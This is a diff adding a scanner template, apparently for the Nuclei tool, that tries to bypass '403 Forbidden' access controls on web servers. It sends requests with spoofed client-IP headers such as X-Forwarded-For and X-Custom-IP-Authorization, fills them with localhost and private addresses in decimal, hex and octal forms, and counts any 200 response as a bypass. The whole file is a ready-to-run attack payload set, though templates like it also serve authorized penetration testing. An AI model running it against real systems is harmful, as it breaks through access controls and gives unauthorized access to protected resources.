@@ -1,0 +1,51 @@
+id: Labda_403Bypass_xheaders
+
+info:
+  name: Labda 403 bypass
+  author: Labda
+  description: Bypasses 403 Forbidden
+  tags: bypass, web, 403, Forbidden
+
+requests:
+  - raw:
+      - |+
+        GET / HTTP/1.1
+        Host: {{BaseURL}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
+        {{header_types}}: {{header_values}}
+    payloads:
+      header_values:
+        - localhost
+        - localhost:80
+        - localhost:443
+        - "127.0.0.1"
+        - "127.0.0.1:80"
+        - "127.0.0.1:443"
+        - "2130706433"
+        - "0x7F000001"
+        - "0177.0000.0000.0001"
+        - "0"
+        - "127.1"
+        - "10.0.0.0"
+        - "10.0.0.1"
+        - "172.16.0.0"
+        - "172.16.0.1"
+        - "192.168.1.0"
+        - "192.168.1.1"
+      header_types:
+        - X-Custom-IP-Authorization
+        - X-Forwarded-For
+        - X-Forward-For
+        - X-Remote-IP
+        - X-Originating-IP
+        - X-Remote-Addr
+        - X-Client-IP
+        - X-Real-IP
+    attack: clusterbomb
+    unsafe: true
+    matchers:
+        - type: status
+          status:
+            - 200
+
+
